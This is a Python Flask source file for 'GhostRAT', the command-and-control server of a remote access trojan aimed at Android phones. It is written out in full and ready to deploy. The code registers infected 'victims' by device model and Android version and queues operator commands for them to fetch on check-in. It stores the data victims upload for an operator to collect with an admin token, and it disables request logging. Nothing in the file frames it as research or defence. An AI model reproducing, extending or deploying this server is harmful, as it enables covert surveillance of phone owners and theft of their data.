#!/usr/bin/env python3
"""
GhostRAT C2 Server — Render Compatible
"""
import os
import json
import hashlib
import secrets
import time
from flask import Flask, request, jsonify
from datetime import datetime
import logging

app = Flask(__name__)

# Disable Flask logs
log = logging.getLogger('werkzeug')
log.disabled = True

# In-memory storage
victims = {}
commands = {}
data_store = {}

# Admin token
ADMIN_TOKEN = os.environ.get('ADMIN_TOKEN', secrets.token_hex(32))

# ============ VICTIM ENDPOINTS ============

@app.route('/')
def home():
    return jsonify({'status': 'GhostRAT C2 Active', 'victims': len(victims)})

@app.route('/victim/register', methods=['POST'])
def victim_register():
    try:
        data = request.get_json()
        victim_id = hashlib.sha256(
            (data.get('device_id', '') + str(time.time())).encode()
        ).hexdigest()[:16]
        
        victims[victim_id] = {
            'model': data.get('model', 'Unknown'),
            'android': data.get('android', 'Unknown'),
            'last_seen': datetime.now().isoformat(),
            'online': True
        }
        commands[victim_id] = []
        data_store[victim_id] = []
        
        return jsonify({'status': 'registered', 'victim_id': victim_id, 'check_interval': 30})
    except:
        return jsonify({'status': 'error'}), 400

@app.route('/victim/checkin', methods=['POST'])
def victim_checkin():
    try:
        data = request.get_json()
        victim_id = data.get('victim_id', '')
        
        if victim_id not in victims:
            return jsonify({'status': 'unknown'}), 404
        
        victims[victim_id]['last_seen'] = datetime.now().isoformat()
        victims[victim_id]['online'] = True
        
        pending = commands.get(victim_id, [])
        commands[victim_id] = []
        
        return jsonify({'status': 'ok', 'commands': pending})
    except:
        return jsonify({'status': 'error'}), 400

@app.route('/victim/upload', methods=['POST'])
def victim_upload():
    try:
        data = request.get_json()
        victim_id = data.get('victim_id', '')
        payload = data.get('data', '')
        data_type = data.get('type', 'unknown')
        
        if victim_id not in victims:
            return jsonify({'status': 'unknown'}), 404
        
        data_store[victim_id].append({
            'type': data_type,
            'data': payload,
            'time': datetime.now().isoformat()
        })
        
        if len(data_store[victim_id]) > 100:
            data_store[victim_id] = data_store[victim_id][-100:]
        
        victims[victim_id]['last_seen'] = datetime.now().isoformat()
        return jsonify({'status': 'stored'})
    except:
        return jsonify({'status': 'error'}), 400

# ============ ADMIN ENDPOINTS ============

def verify_admin(req):
    token = req.headers.get("X-Admin-Token", "")
    return token == ADMIN_TOKEN

@app.route('/admin/victims', methods=['GET'])
def admin_get_victims():
    if not verify_admin(request):
        return jsonify({'error': 'Unauthorized'}), 403
    
    result = []
    for vid, info in victims.items():
        result.append({
            'victim_id': vid,
            'model': info['model'],
            'online': info['online'],
            'last_seen': info['last_seen'],
            'pending_data': len(data_store.get(vid, []))
        })
    return jsonify({'victims': result})

@app.route('/admin/send_command', methods=['POST'])
def admin_send_command():
    if not verify_admin(request):
        return jsonify({'error': 'Unauthorized'}), 403
    
    data = request.get_json()
    victim_id = data.get('victim_id', '')
    command = data.get('command', '')
    cmd_type = data.get('type', 'raw')
    
    if victim_id not in victims:
        return jsonify({'error': 'Victim not found'}), 404
    
    commands[victim_id].append({
        'type': cmd_type,
        'command': command,
        'time': datetime.now().isoformat()
    })
    return jsonify({'status': 'queued'})

@app.route('/admin/get_data', methods=['POST'])
def admin_get_data():
    if not verify_admin(request):
        return jsonify({'error': 'Unauthorized'}), 403
    
    data = request.get_json()
    victim_id = data.get('victim_id', '')
    
    pending = data_store.get(victim_id, [])
    data_store[victim_id] = []
    
    return jsonify({'victim_id': victim_id, 'data_count': len(pending), 'data': pending})

@app.route('/ping', methods=['GET'])
def ping():
    return jsonify({'status': 'alive'})

# ============ MAIN ============
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    print(f"[!] ADMIN_TOKEN: {ADMIN_TOKEN}")
    print(f"[!] SAVE THIS TOKEN!")
    app.run(host='0.0.0.0', port=port)
